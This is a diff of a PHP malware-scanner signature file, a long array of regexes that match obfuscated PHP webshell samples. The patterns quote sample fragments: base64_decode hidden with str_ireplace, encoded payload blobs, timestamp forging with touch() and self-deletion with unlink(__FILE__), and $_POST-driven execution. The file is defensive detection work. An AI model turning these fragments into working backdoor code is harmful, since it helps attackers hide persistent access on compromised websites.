+      'pattern' => '/^\\s*\\<\\?php \\$xxwqptnq\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$znkstzc\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    264 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}zhzNDyFM5augWZ3N17YeeS4Xnr2GqCRU5sqkw7pp1QnBPZQD/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    265 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$asbeerz\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$yrwwhpxusu\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    266 => 
+    array (
+      'pattern' => '/_exists\\(PATH \\. \'\\/error\\.php\'\\)\\)
+	\\{
+		header\\(\'Locat[\\s\\S]{0,12000}or         \\(        \\$win_error, E_USER_ERROR\\)
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    267 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "QYGRCZZFde"; if \\(file_exists\\("\\.\\/chain\\.func\\.php"\\)\\)\\{ touch\\("\\.\\/chain\\.func\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*U7C2B/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    268 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "hPFHqReVfZ"; if \\(file_exists\\("\\.\\/index\\-print\\.php"\\)\\)\\{ touch\\("\\.\\/index\\-print\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Ut4/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    269 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "qnDBaspVPB"; if \\(file_exists\\("\\.\\/chartaxd\\.php"\\)\\)\\{ touch\\("\\.\\/chartaxd\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2QbBtdd7x/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    270 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mkknfzbh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wptmqadpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    271 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wtqdc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$yksceweqxc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    272 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Libraries
+ \\* \\*\\*\\*\\*[\\s\\S]{0,12000}GeDg4V2KBcAfQefGbEw2Qx7Pe1Zk4vXhtukhGsVD2
+if \\(\\(f/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    273 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "RKPmBVdPyb"; if \\(file_exists\\("\\.\\/orderterms\\.php"\\)\\)\\{ touch\\("\\.\\/orderterms\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1Sbvn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    274 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ecddgtv\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$vanbprznm\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    275 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}lhSamIyNW1hV2NpSUVGT1JDQWtaVzU1YzJSdWFEMDlKRjlIU/s',
       'label' => 'sample-specific content window chain',
     ),
-    1209 => 
+    276 => 
     array (
-      'pattern' => '/\\.authcode\\(SXSL,"DECODE",\\$key,0\\),dirname\\(__FILE__\\)\\.authcode\\(WPI,"DECODE",\\$key,0\\)\\.authcode\\(SXSL,"DECODE",\\$key,0\\)\\.[\\s\\S]{0,160}\\.authcode\\(WPPHP,"DECODE",\\$key,0\\); file_put_contents\\(\\$phpinfopath,\\$phpinfocontent\\); copy\\(dirname\\(__FILE__\\)\\./',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php \\$vdgdwbbfz\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$dvzrvfeeyy\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1210 => 
+    277 => 
     array (
-      'pattern' => '/\\/
-		printf\\( __\\( \'The site %s is yours\\.\' \\), \\$site \\);
-	\\?\\>
-	\\<\\/h2\\>
-	\\<p\\>
-		\\<\\?php
-		printf\\(
-			\\/\\* translators\\: 1\\: Link to new/s',
+      'pattern' => '/^\\s*\\<\\?php \\$khezmpvsb\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$daseqzdt\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    278 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mkdcfd\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$zfyrkwwf\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    279 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "AhvysprEPs"; if \\(file_exists\\("\\.\\/refinesearch\\.php"\\)\\)\\{ touch\\("\\.\\/refinesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*F/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    280 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$cbwsrxemp\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$nemwpds\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    281 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wyvbcq\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$xmdvvskpe\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    282 => 
+    array (
+      'pattern' => '/Ums5U0p5d05DaTh2SjBoVVZGQmZSazlTVjBGU1JFVkVKeXdO[\\s\\S]{0,12000}E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    283 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kxfptxy\\=str_ireplace\\("z","","zzzbzzzzazzzzszzzzezzzz6zzzzzz4zz_zzzzzdzzzezzzzzczzzzzzozzzzdzzezzz"\\); \\$smbpza\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    284 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\(     \\$_POST\\[\'c\'\\]\\)                    \\)\\)
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    285 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}MaWNnTHk5VlIxRW5PdzBLSkd0aGEyRTlKR3RoTGlkUlZWTXZ/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    286 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vrmztf\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$yrxusbv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    287 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$eeyrhfxdfb\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$mvqzu\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    288 => 
+    array (
+      'pattern' => '/\\(file_exists\\(PATH \\. \'\\/error\\.php\'\\)\\)
+	\\{
+		header\\([\\s\\S]{0,12000}\\(                \\$win_error, E_USER_ERROR\\)
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    289 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+\\* This program is  free software;   y/s',
       'label' => 'sample-specific content window',
     ),
-    1211 => 
+    290 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dbazzqkrms\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$uksubmu\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    291 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yxghhtbv\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$wzszfrqx\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    292 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kqzqt\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$uhygkmgd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    293 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "NYRdmqumWG"; if \\(file_exists\\("\\.\\/fog\\.conf\\.php"\\)\\)\\{ touch\\("\\.\\/fog\\.conf\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*gcXdB7SMK/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    294 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bwgksyvx\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$ebgdpprxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    295 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ksmbansch\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$ehbphba\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    296 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$drxhystxe\\=str_ireplace\\("r","","rrrbrrrarrsrrrerr6rrrrrr4rrr_rrrdrrrrrrerrrrrcrrrrorrrdrrrrer"\\); \\$ckpgyfmmqr\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    297 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "GaHVZMFMVf"; if \\(file_exists\\("\\.\\/write\\-review\\.php"\\)\\)\\{ touch\\("\\.\\/write\\-review\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    298 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wvzhqege\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$ufatzzcb\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    299 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}WVd4MVpUMGlKeTVpWVhObE5qUmZaR1ZqYjJSbEtDUm9lR1Js/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    300 => 
+    array (
+      'pattern' => '/iterator_apply\\(\\$option, \\$win,                    array            \\(\\$it\\)  \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    301 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sfpkstz\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$eeeqsam\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    302 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "UaNUYaBEPr"; if \\(file_exists\\("\\.\\/config\\.serious\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.serious\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    303 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bvaknw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qbfufeegv\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    304 => 
+    array (
+      'pattern' => '/usort            \\( \\$b, \\$a                          \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    305 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gsmfrtg\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$rcpszueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    306 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ewqhz\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$ahuyvekagd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    307 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sbqmqhmy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bqkrgmpr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    308 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qufvgymnkf\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$braratrmqu\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    309 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "rxUQDaqxMU"; if \\(file_exists\\("\\.\\/locator\\.php"\\)\\)\\{ touch\\("\\.\\/locator\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*73K565h5awc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    310 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gbannq\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$qfvxv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    311 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+@ This     program is      distribute/s',
+      'label' => 'sample-specific content window',
+    ),
+    312 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gsxnshpzzt\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ywzkbswt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    313 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wmxmcngn\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$hwfkwy\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    314 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\(\\$it\\)                    \\)
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    315 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "EVzGkVNksa"; if \\(file_exists\\("\\.\\/config\\.angle\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.angle\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    316 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mezrtt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stskhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    317 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wxgrkt\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$uyxkp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    318 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uechxztts\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$wqzsyudhce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    319 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gpykd\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$cdbxazpn\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    320 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dcvresgn\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$mpwmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    321 => 
+    array (
+      'pattern' => '/ZVbFpGVWxzblVrVk5UMVJGWDBGRVJGSW5YVHNnZlEwS2FXWW[\\s\\S]{0,12000}K\'\\)\\)
+\\{
+	define\\(\'XHMPGK\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    322 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rwfzhnz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evxayg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    323 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fexqx\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$dvaegz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    324 => 
+    array (
+      'pattern' => '/M4Wm05eWJTQnVZVzFsUFNKbWIzSnRNU0lnYldWMGFHOWtQU0[\\s\\S]{0,12000}\\(\'DVPF\'\\)\\)
+\\{
+	define\\(\'DVPF\', __DIR__\\);
+\\}
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    325 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fgdrspkz\\=str_ireplace\\("z","","zzzbzzzzzzazzzszzzzezzzzz6zzzz4zzzzz_zzzdzzzzezzzzczzzzzozzzzdzzzez"\\); \\$bxqtb\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    326 => 
+    array (
+      'pattern' => '/sUFNKbWIzSnRNU0lnYldWMGFHOWtQU0p3YjNOMElpQmhZM1J[\\s\\S]{0,12000}\\)\\)
+\\{
+	define\\(\'UYWMFP\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    327 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "CSYGDSrZrt"; if \\(file_exists\\("\\.\\/admin_awards\\.php"\\)\\)\\{ touch\\("\\.\\/admin_awards\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    328 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "cAkDwsWZDW"; if \\(file_exists\\("\\.\\/meinedaten\\.php"\\)\\)\\{ touch\\("\\.\\/meinedaten\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*e3zpy/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    329 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tfutw\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$pgcbam\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    330 => 
+    array (
+      'pattern' => '/bDZaVzltS0NSbWFXeGxLVHNrYVNzcktRMEthV1lvSkdrOVBU[\\s\\S]{0,12000}DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    331 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wnxdd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evhaqzpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    332 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ztzxbffby\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$uvgdqkwrqh\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    333 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rzyeqhwv\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$nzbzs\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    334 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "NzQCXmpDhY"; if \\(file_exists\\("\\.\\/init\\.tongue\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.tongue\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*H2Y/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    335 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}yWVd4MVpUMGlKeTRrY0hwblltdDJaM3BuWTJOa0xpY2lQand/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    336 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mpaevpq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$cgcwf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    337 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "RqQsGVRrKy"; if \\(file_exists\\("\\.\\/staff\\-login\\.php"\\)\\)\\{ touch\\("\\.\\/staff\\-login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9Kt/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    338 => 
+    array (
+      'pattern' => '/Lypoa3J3ZnJrciovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnJr/',
+      'label' => 'sample-specific encoded fragment',
+    ),
+    339 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vkcyaecxa\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$srkvktfv\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    340 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vcehpv\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$rqayk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    341 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xnfvqeepxg\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyyy6yyy4yyyyyy_yydyyyyyeyyyyycyyyyoyydyyyyyyeyy"\\); \\$xmddydsvdh\\="DQoJCUBlcnJvcl9yZX/s',
